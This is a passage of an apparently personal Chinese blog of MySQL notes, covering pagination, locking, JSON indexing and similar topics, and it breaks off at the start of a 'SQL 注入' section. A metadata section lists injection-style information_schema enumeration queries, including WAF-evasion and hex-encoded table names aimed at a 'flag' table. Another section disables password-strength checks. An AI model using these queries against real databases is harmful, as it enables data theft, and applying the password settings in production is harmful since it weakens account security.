class="line"><span class="string">1) "0"</span></span><br><span class="line"><span class="string">2) 1) "login:20190323"</span></span><br><span class="line"><span class="string">   2) "login:20190322"</span></span><br><span class="line"><span class="string">   3) "login:20190321"</span></span><br></pre></td></tr></table></figure>
<h3 id="mysql5-7Incorrect-datetime-value-‘0000-00-00-00-00-00’-for-column"><a href="#mysql5-7Incorrect-datetime-value-‘0000-00-00-00-00-00’-for-column" class="headerlink" title="mysql5.7Incorrect datetime value: ‘0000-00-00 00:00:00’ for column"></a>mysql5.7Incorrect datetime value: ‘0000-00-00 00:00:00’ for column</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`created_at`</span> timestamp NOT NULL DEFAULT <span class="string">'0000-00-00 00:00:00'</span>, </span><br><span class="line"><span class="string">`updated_at`</span> timestamp NOT NULL DEFAULT <span class="string">'0000-00-00 00:00:00'</span>,</span><br><span class="line">show variables like <span class="string">'sql_m%'</span>;</span><br><span class="line">sql_mode      | ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION </span><br><span class="line"></span><br><span class="line">alter table test modify created_at datetime NOT NULL;</span><br><span class="line">alter table test modify updated_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP;</span><br><span class="line"></span><br><span class="line"><span class="number">5.7</span> timestamp类型取值范围：<span class="number">1970</span><span class="number">-01</span><span class="number">-01</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> 到 <span class="number">2037</span><span class="number">-12</span><span class="number">-31</span> <span class="number">23</span>:<span class="number">59</span>:<span class="number">59</span>，初始值调整为 <span class="number">1970</span><span class="number">-01</span><span class="number">-02</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> 就可以了 </span><br><span class="line"></span><br><span class="line">alter table test modify created_at timestamp NOT NULL DEFAULT <span class="string">'1970-01-02 00:00:00'</span>;</span><br><span class="line">alter table test modify updated_at timestamp NOT NULL DEFAULT <span class="string">'1970-01-02 00:00:00'</span>;</span><br></pre></td></tr></table></figure>
<h3 id="mysql的limit进行分页时出现重复"><a href="#mysql的limit进行分页时出现重复" class="headerlink" title="mysql的limit进行分页时出现重复"></a>mysql的limit进行分页时出现重复</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> table order by xx limit <span class="number">0</span>,<span class="number">10</span></span><br><span class="line"></span><br><span class="line">当xx不存在索引，且有xx相同的行是，可能出现分页数据重复问题</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">解决办法：</span><br><span class="line">         <span class="number">1.</span>加上索引排序</span><br><span class="line">         select * <span class="keyword">from</span> table order by xx,id（任意有索引的字段） limit <span class="number">0</span>,<span class="number">10</span></span><br><span class="line">         <span class="number">2</span>、给xx字段加上索引</span><br><span class="line">         作为验证，您可以在这个字段上加索引  alter table tea_course_sort add index(course_sort_order)，然后由于这个表数目太小，以防加索引都未必能用得上，语句修改为</span><br><span class="line">       select * <span class="keyword">from</span> tea_course_sort  force index(course_sort_order) order by tea_course_sort.course_sort_order desc  limit <span class="number">0</span>,<span class="number">10</span>;</span><br><span class="line">来得到您预期的结果</span><br><span class="line"> </span><br><span class="line">select  * <span class="keyword">from</span> table_1 where <span class="number">1</span>=<span class="number">1</span> limit m,n</span><br><span class="line"></span><br><span class="line">这样后面的页可能会出现重复数据，这时可以通过加入order by 子句来解决这种情况， select * <span class="keyword">from</span> table_1  where <span class="number">1</span>=<span class="number">1</span> order by field_1 limit m,n</span><br><span class="line"></span><br><span class="line">但是这里需要特别注意，如果field_1字段有相同值的情况下，后面的页还是会出现重复数据，这时可以加入第二个排序字段（值唯一），可以选主键id,</span><br><span class="line"></span><br><span class="line">对应的sql语句是select * <span class="keyword">from</span> table_1  where <span class="number">1</span>=<span class="number">1</span> order by field_1 , id limit m,n</span><br><span class="line"></span><br><span class="line">但是最好保证field_1在表中的值是唯一的，这样就可以少写一个排序字段，增加查询效率，因为在只有一个排序字段的情况下，mysql会使用索引，如果是有多个排序字段的话，mysql会放弃索引做全表扫描。</span><br></pre></td></tr></table></figure>
<h3 id="预估-Mysql-数据表的数据大小和索引大小"><a href="#预估-Mysql-数据表的数据大小和索引大小" class="headerlink" title="预估 Mysql 数据表的数据大小和索引大小"></a>预估 Mysql 数据表的数据大小和索引大小</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT data_length,index_length</span><br><span class="line">FROM information_schema.TABLES t</span><br><span class="line">WHERE table_schema=<span class="string">'your_db_name'</span></span><br><span class="line">AND table_name = <span class="string">'your_table_name'</span>;</span><br><span class="line">直接查询 avg_row_length 字段，这个字段表示数据表的平均行大小，和上面自己计算的结果类似。</span><br><span class="line">SHOW COLUMNS FROM TABLES;</span><br><span class="line">https:<span class="comment">//www.playpi.org/2019041001.html</span></span><br></pre></td></tr></table></figure>
<h3 id="mysql-limit查询优化方法"><a href="#mysql-limit查询优化方法" class="headerlink" title="mysql limit查询优化方法"></a>mysql limit查询优化方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">对同一张表在不同的地方取<span class="number">10</span>条数据： <span class="number">1</span>）offset比较小时  </span><br><span class="line"> </span><br><span class="line">代码示例: select * <span class="keyword">from</span> user limit <span class="number">10</span>,<span class="number">10</span>;   这条sql语句多次运行，时间保持在<span class="number">0.0004</span><span class="number">-0.0005</span>之间。  </span><br><span class="line"> </span><br><span class="line">代码示例: select * <span class="keyword">from</span> user where uid &gt;=( select uid <span class="keyword">from</span> user order by uid limit <span class="number">10</span>,<span class="number">1</span> ) limit <span class="number">10</span>;   这条sql语句多次运行，时间保持在<span class="number">0.0005</span><span class="number">-0.0006</span>之间，主要是<span class="number">0.0006</span>。 结论：偏移offset较小时，直接使用limit较优。这个显然是子查询的原因。</span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>）offset大时  </span><br><span class="line"> </span><br><span class="line">代码示例: select * <span class="keyword">from</span> user limit <span class="number">10000</span>,<span class="number">10</span>;   这条sql语句多次运行，时间保持在<span class="number">0.0187</span>左右  </span><br><span class="line"> </span><br><span class="line">代码示例: select * <span class="keyword">from</span> user where uid &gt;=( select uid <span class="keyword">from</span> user order by uid limit <span class="number">10000</span>,<span class="number">1</span> ) limit <span class="number">10</span>; 这条sql语句多次运行，时间保持在<span class="number">0.0061</span>左右，只有前者的<span class="number">1</span>/<span class="number">3</span>。可以预计offset越大，后者越优。</span><br><span class="line"> </span><br><span class="line">通过以上对比，得出mysql limit查询语句优化经验： 使用limit语句时，当数据量偏移量较小时可以直接使用limit，当数据量偏移量较大时，可以适当的使用子查询来做相关的性能优化。</span><br><span class="line">--------------------- </span><br><span class="line"> select * <span class="keyword">from</span> test a inner join (select id <span class="keyword">from</span> test where val=<span class="number">4</span> limit <span class="number">300000</span>,<span class="number">5</span>) b on a.id=b.id;</span><br></pre></td></tr></table></figure>
<h3 id="FOUND-ROWS"><a href="#FOUND-ROWS" class="headerlink" title="FOUND_ROWS()"></a>FOUND_ROWS()</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">分页程序一般由两条SQL组成：</span><br><span class="line">SELECT COUNT(*) FROM ... WHERE ....</span><br><span class="line">SELECT ... FROM ... WHERE LIMIT ...</span><br><span class="line"></span><br><span class="line">如果使用SQL_CALC_FOUND_ROWS的话，一条SQL就可以了：</span><br><span class="line">SELECT SQL_CALC_FOUND_ROWS ... FROM ... WHERE LIMIT ...</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">当我们在处理分页程序的时候，会使用 limit 来限制返回的数量，然后会有两种获取分页的方法：</span><br><span class="line"></span><br><span class="line">第一种方法：</span><br><span class="line"></span><br><span class="line">在 SELECT 语句中加入 SQL_CALC_FOUND_ROWS 选项，然后通过 SELECT FOUND_ROWS() 来获取总行数：</span><br><span class="line"></span><br><span class="line">SELECT SQL_CALC_FOUND_ROWS * FROM table WHERE id &gt; <span class="number">100</span> LIMIT <span class="number">10</span>;</span><br><span class="line">SELECT FOUND_ROWS();</span><br><span class="line">第二种方式：</span><br><span class="line">使用正常的 SQL 语句，然后再用 SELECT COUNT(*) 来获取总行数：</span><br><span class="line"></span><br><span class="line">SELECT * FROM table WHERE id &gt; <span class="number">100</span> LIMIT <span class="number">10</span>;</span><br><span class="line">SELECT COUNT(*) FROM table WHERE id &gt; <span class="number">100</span>;</span><br><span class="line">经过测试，一般来说 SQL_CALC_FOUND_ROWS 是比较慢的，SQL执行的时间甚至会达到<span class="number">10</span>倍那么夸张，所以最好别使用 MySQL 的 SQL_CALC_FOUND_ROWS 来获取总行数</span><br></pre></td></tr></table></figure>
<h3 id="left-join-on-where"><a href="#left-join-on-where" class="headerlink" title="left join on where"></a>left join on where</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">使用了 left join，where 是针对左表，但左表是日期表，那如何做业务表上的条件限制</span><br><span class="line">数据库在通过连接两张或多张表来返回记录时，都会生成一张中间的临时表，然后再将这张临时表返回给用户；</span><br><span class="line"></span><br><span class="line">where 条件是在临时表生成好后，再对临时表进行过滤的条件；</span><br><span class="line"></span><br><span class="line">因此：where 条件加上，已经没有 left join 的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。</span><br><span class="line"></span><br><span class="line">解决方案是把限制条件放在 on 后面</span><br><span class="line"></span><br><span class="line">select a.*,b.*</span><br><span class="line"><span class="keyword">from</span> table1 a</span><br><span class="line">left join table2 b on b.X=a.X and XXX</span><br><span class="line">结论：https:<span class="comment">//learnku.com/articles/26796 </span></span><br><span class="line"></span><br><span class="line">where 后面：是先连接然生成临时查询结果，然后再筛选</span><br><span class="line"></span><br><span class="line">on 后面：先根据条件过滤筛选，再连 生成临时查询结果</span><br></pre></td></tr></table></figure>
<h3 id="如何索引-JSON-字段"><a href="#如何索引-JSON-字段" class="headerlink" title="如何索引 JSON 字段"></a>如何索引 JSON 字段</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE <span class="string">`players`</span> (  </span><br><span class="line">   <span class="string">`id`</span> INT UNSIGNED NOT NULL,</span><br><span class="line">   <span class="string">`player_and_games`</span> <span class="built_in">JSON</span> NOT NULL,</span><br><span class="line">   <span class="string">`names_virtual`</span> VARCHAR(<span class="number">20</span>) GENERATED ALWAYS AS (<span class="string">`player_and_games`</span> -&gt;&gt; <span class="string">'$.name'</span>) NOT NULL, </span><br><span class="line">   PRIMARY KEY (<span class="string">`id`</span>)</span><br><span class="line">);</span><br><span class="line">SELECT * FROM <span class="string">`players`</span>;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/27046#topnav</span></span><br><span class="line">+----+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+</span><br><span class="line">| id | player_and_games                                                                                                                                                                                           | names_virtual |</span><br><span class="line">+----+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+</span><br><span class="line">|  <span class="number">1</span> | &#123;<span class="string">"id"</span>: <span class="number">1</span>, <span class="string">"name"</span>: <span class="string">"Sally"</span>, <span class="string">"games_played"</span>: &#123;<span class="string">"Puzzler"</span>: &#123;<span class="string">"time"</span>: <span class="number">7</span>&#125;, <span class="string">"Battlefield"</span>: &#123;<span class="string">"rank"</span>: <span class="string">"Sergeant V"</span>, <span class="string">"level"</span>: <span class="number">20</span>, <span class="string">"weapon"</span>: <span class="string">"sniper rifle"</span>&#125;, <span class="string">"Crazy Tennis"</span>: &#123;<span class="string">"won"</span>: <span class="number">4</span>, <span class="string">"lost"</span>: <span class="number">1</span>&#125;&#125;&#125;                  | Sally         |</span><br><span class="line">|  <span class="number">2</span> | &#123;<span class="string">"id"</span>: <span class="number">2</span>, <span class="string">"name"</span>: <span class="string">"Thom"</span>, <span class="string">"games_played"</span>: &#123;<span class="string">"Puzzler"</span>: &#123;<span class="string">"time"</span>: <span class="number">25</span>&#125;, <span class="string">"Battlefield"</span>: &#123;<span class="string">"rank"</span>: <span class="string">"Major General VIII"</span>, <span class="string">"level"</span>: <span class="number">127</span>, <span class="string">"weapon"</span>: <span class="string">"carbine"</span>&#125;, <span class="string">"Crazy Tennis"</span>: &#123;<span class="string">"won"</span>: <span class="number">10</span>, <span class="string">"lost"</span>: <span class="number">30</span>&#125;&#125;&#125;            | Thom          |</span><br><span class="line">CREATE INDEX <span class="string">`names_idx`</span> ON <span class="string">`players`</span>(<span class="string">`names_virtual`</span>);  </span><br><span class="line"></span><br><span class="line">EXPLAIN SELECT * FROM <span class="string">`players`</span> WHERE <span class="string">`names_virtual`</span> = <span class="string">"Sally"</span>\G  </span><br><span class="line">*************************** <span class="number">1.</span> row ***************************</span><br><span class="line">           id: <span class="number">1</span></span><br><span class="line">  select_type: SIMPLE</span><br><span class="line">        table: players</span><br><span class="line">   partitions: NULL</span><br><span class="line">         type: ref</span><br><span class="line">possible_keys: names_idx  </span><br><span class="line">          key: names_idx</span><br><span class="line">      key_len: <span class="number">22</span></span><br><span class="line">          ref: <span class="keyword">const</span></span><br><span class="line">         rows: <span class="number">1</span></span><br><span class="line">     filtered: <span class="number">100.00</span></span><br><span class="line">        Extra: NULL</span><br></pre></td></tr></table></figure>
<h3 id="length-检测-vachar-字节长度"><a href="#length-检测-vachar-字节长度" class="headerlink" title="length 检测 vachar 字节长度"></a>length 检测 vachar 字节长度</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">insert into test value (<span class="number">1</span>, <span class="string">'测'</span>)</span><br><span class="line">SELECT id, LENGTH(str), CHAR_LENGTH(str) FROM test;返回结果是 <span class="number">1</span> <span class="number">3</span> <span class="number">1</span></span><br><span class="line">ALTER TABLE <span class="string">`test`</span></span><br><span class="line">ADD COLUMN <span class="string">`str2`</span>  varchar(<span class="number">2000</span>) NULL AFTER <span class="string">`str`</span>;</span><br><span class="line">SELECT id, LENGTH(str2), CHAR_LENGTH(str2) FROM test where id = <span class="number">2</span>;</span><br><span class="line">添加了一个 str2 字段，然后插入 <span class="number">256</span> 个汉字，返回结果是</span><br><span class="line"><span class="number">2</span> <span class="number">768</span> <span class="number">256</span></span><br><span class="line">mysql lenght 是字符串所占的字节，并没有计算额外的所需字节。https:<span class="comment">//learnku.com/laravel/t/27848</span></span><br></pre></td></tr></table></figure>
<h3 id="浅析乐观锁与悲观锁"><a href="#浅析乐观锁与悲观锁" class="headerlink" title="浅析乐观锁与悲观锁"></a>浅析乐观锁与悲观锁</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">使用悲观锁https:<span class="comment">//learnku.com/articles/27880</span></span><br><span class="line">悲观并发控制实际上是 “先取锁，再访问” 的保守策略，为数据处理的安全提供了保证。</span><br><span class="line">begin;</span><br><span class="line">select quantity <span class="keyword">from</span> products where id = <span class="number">1</span> <span class="keyword">for</span> update;</span><br><span class="line">update products set quanntity = <span class="number">2</span> where id = <span class="number">1</span>;</span><br><span class="line">commit;</span><br><span class="line">以上，对 id 为 <span class="number">1</span> 的产品进行修改，先通过 <span class="keyword">for</span> update 的方式进行加锁，然后再修改。典型的悲观锁策略。</span><br><span class="line">在对数据修改前，尝试增加排他锁。</span><br><span class="line">加锁失败，意味着数据正在被修改，进行等待或者抛出异常。</span><br><span class="line">加锁成功，对数据进行修改，提交事务，锁释放。</span><br><span class="line">如果我们加锁成功，有其他线程对该数据进操作或者加排他锁的操作，只能等待或者抛出异常。</span><br><span class="line"></span><br><span class="line">如果修改库存的逻辑发生并发，同一时间只有一个线程可以开启事务并获得 id = <span class="number">1</span> 的锁，其他事务必须等本次提交之后才能执行，这样可以保证数据不被其他事务修改。</span><br><span class="line"></span><br><span class="line">使用排他锁会把数据锁住，不过需要注意一些基本的锁级别，MySQL InnoDB 默认行级锁。行级锁是基于索引的，如果一条 SQL 语句用不到索引是不会使用行级锁，会使用表级锁把整张表锁住。</span><br><span class="line">使用乐观锁</span><br><span class="line"></span><br><span class="line">select quantity <span class="keyword">from</span> products where id = <span class="number">1</span></span><br><span class="line">update products set quantity = <span class="number">2</span> where id = <span class="number">1</span> and quantity = <span class="number">3</span></span><br><span class="line">先查询库存表当前库存数，然后更新的时候判断数据表对应数据的 quantity 与第一次取出来的是否一致，一致则更新，否则认为是过期数据。</span><br><span class="line"></span><br><span class="line">这样实现有一个问题，线程 <span class="number">1</span> 从数据库取出 quantity 为 <span class="number">3</span>，线程 <span class="number">2</span> 也取出同一条数据的 quantity，进行操作，变成了 <span class="number">2</span>，然后又进行某些操作 变成了 <span class="number">3</span>，此时线程 <span class="number">1</span> 进行更新操作成功。但是这个过程有问题。</span><br><span class="line"></span><br><span class="line">引入 version 参数，乐观锁每次在执行数据修改的操作，都会带上版本号，一旦版本号和数据的版本号一致就可以执行修改操作并对 version 执行 +<span class="number">1</span> 操作，否则就执行失败。</span><br><span class="line"></span><br><span class="line">这样实现也有一个问题，如果真的有高并发的时候，就只有一个线程可以修改成功，就会存在大量的失败。</span><br><span class="line"></span><br><span class="line">如果你的应用存在超高并发，这样解决也不好，因为会总让用户感知到失败。</span><br><span class="line"></span><br><span class="line">尝试减小乐观锁力度，最大程度提高吞吐。</span><br><span class="line"></span><br><span class="line">update products set quantity = quantity - <span class="number">1</span> where id = <span class="number">1</span> and quanntity - <span class="number">1</span> &gt; <span class="number">0</span></span><br><span class="line">使用这条 SQL 语句，在执行过程中，会在一次原子操作中查询一遍 quantity 的值，并且减去 <span class="number">1</span>。</span><br><span class="line">laravel 悲观锁对应 lockForUpdate，乐观锁对应 sharedLock https:<span class="comment">//learnku.com/docs/laravel/5.8/queries/3926</span></span><br></pre></td></tr></table></figure>
<p><img src="https://iocaffcdn.phphub.org/uploads/images/201904/24/27516/LoRNLmbvjW.png!large" alt=""><br><img src="https://iocaffcdn.phphub.org/uploads/images/201904/24/27516/DnQMqeCmUn.png!large" alt=""></p>
<h3 id="mysql-8-0-使用简单密码"><a href="#mysql-8-0-使用简单密码" class="headerlink" title="mysql 8.0 使用简单密码"></a>mysql 8.0 使用简单密码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">直接在 my.cnf 配置文件中 [mysqld] 部分加入下面参数，然后重启 mysqld 即可。</span><br><span class="line"></span><br><span class="line">validate_password.policy = <span class="number">0</span></span><br><span class="line">validate_password.mixed_case_count = <span class="number">0</span></span><br><span class="line">validate_password.number_count = <span class="number">0</span></span><br><span class="line">validate_password.special_char_count = <span class="number">0</span></span><br><span class="line">validate_password.length = <span class="number">0</span></span><br><span class="line">validate_password.policy</span><br><span class="line"></span><br><span class="line">可以配置密码的复杂度，可以配置的级别：</span><br><span class="line"></span><br><span class="line"><span class="number">0</span> or LOW</span><br><span class="line"><span class="number">1</span> or MEDIUM</span><br><span class="line"><span class="number">2</span> or STRONG</span><br><span class="line">validate_password.length</span><br><span class="line"></span><br><span class="line">最终密码的长度，允许为 <span class="number">0</span> ，但是要注意这里有个坑，validate_password.length 的长度要大于 validate_password.mixed_case_count + validate_password.number_count + validate_password.special_char_count 的和。 例如默认这 <span class="number">3</span> 个 参数的长度都是 <span class="number">1</span>， 所以密码长度最小也只能是 <span class="number">4</span>， 即使配置成了 <span class="number">1</span> 或者 <span class="number">0</span> ，最终它也会自动变成 <span class="number">4</span> 。 要是想使用 <span class="number">0</span> 的长度，需要将另外三个参数也配置成 <span class="number">0</span> 。</span><br><span class="line">https:<span class="comment">//broqiang.com/posts/mysql-8-0-uses-a-simple-password</span></span><br></pre></td></tr></table></figure>
<h3 id="Mysql-批量更新多行"><a href="#Mysql-批量更新多行" class="headerlink" title="Mysql 批量更新多行"></a>Mysql 批量更新多行</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">update test set test.sex = <span class="keyword">case</span> name</span><br><span class="line">	when <span class="string">'小白'</span> then <span class="number">2</span></span><br><span class="line">	when <span class="string">'小红'</span> then <span class="number">2</span></span><br><span class="line">	<span class="keyword">else</span> <span class="number">11</span></span><br><span class="line">	end</span><br><span class="line">where name <span class="keyword">in</span> (<span class="string">'小白'</span>,<span class="string">'小红'</span>) and test.group = <span class="number">1</span></span><br><span class="line">https:<span class="comment">//www.h57.pw/2016/09/11/mysql-batch-update-multiline-notes/</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL中的注释符"><a href="#MySQL中的注释符" class="headerlink" title="MySQL中的注释符"></a>MySQL中的注释符</h3><pre><code># 注释从#字符到行尾
-- 注释从–序列到行尾，后面需要跟上一个或多个空格，tab也可以
/* */ 注释中间的字符
</code></pre><h3 id="获取元数据"><a href="#获取元数据" class="headerlink" title="获取元数据"></a>获取元数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> 获取当前的数据库用户，数据库名称，数据库的版本信息</span><br><span class="line">select user(),database(),version() <span class="keyword">from</span> dual;</span><br><span class="line"># 查询数据库，有时需要限制返回的数量，或者偏移，例如页面只显示一条数据的情况 limit 0,1 limit 1,2</span><br><span class="line"># 需要通过偏移来返回所有的数据库</span><br><span class="line">select schema_name <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"># group_concat 函数是将多行数据连接成一行</span><br><span class="line">select group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"># 查询表</span><br><span class="line"># 方法1</span><br><span class="line">select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database();  </span><br><span class="line"># 方法2</span><br><span class="line">select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">'database_name'</span>;</span><br><span class="line"># 方法3</span><br><span class="line">select table_name <span class="keyword">from</span> information_schema.tables where table_schema=(select database());</span><br><span class="line"></span><br><span class="line"># 查询列</span><br><span class="line">select column_name <span class="keyword">from</span> information_schema.columns where table_schema=<span class="string">'database_name'</span> and table_name=<span class="string">'users'</span>;</span><br><span class="line">select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_schema=database() and table_name=<span class="string">'flag'</span>;</span><br><span class="line"></span><br><span class="line"># 上面可能会被waf识别，也可以这样</span><br><span class="line">select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">'users'</span>;</span><br><span class="line"></span><br><span class="line"># 字符串可以转换成16进制</span><br><span class="line">select concat(group_concat(distinct+column_name)) <span class="keyword">from</span> information_schema.columns where table_name=<span class="number">0x696e666f</span>;</span><br><span class="line"><span class="string">``</span><span class="string">`   </span></span><br><span class="line"><span class="string">### max key length is 767</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line">使用 mysql5<span class="number">.7</span> 没有问题，可以正常 migrate,</span><br><span class="line">使用 mysql5<span class="number">.6</span> 时，就出现这个问题，把字段长度缩小可以解决</span><br><span class="line">由于 MySQL Innodb 引擎表索引字段长度的限制为 <span class="number">767</span> 字节，因此对于多字节字符集的大字段（或者多字段组合索引），创建索引会出现上面的错误。</span><br><span class="line">以 utf8mb4 字符集 字符串类型字段为例：utf8mb4 是 <span class="number">4</span> 字节字符集，则默认支持的索引字段最大长度是： <span class="number">767</span> 字节 / <span class="number">4</span> 字节每字符 = <span class="number">191</span> 字符，因此在 varchar (<span class="number">255</span>) 或 char (<span class="number">255</span>) 类型字段上创建索引会失败。https:<span class="comment">//learnku.com/laravel/t/28819</span></span><br><span class="line">处理方案：在 App\Providers\AppServiceProvider 的 boot () 方法中添加 \Illuminate\Support\Facades\Schema::defaultStringLength(<span class="number">191</span>); 即可</span><br></pre></td></tr></table></figure>
<h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 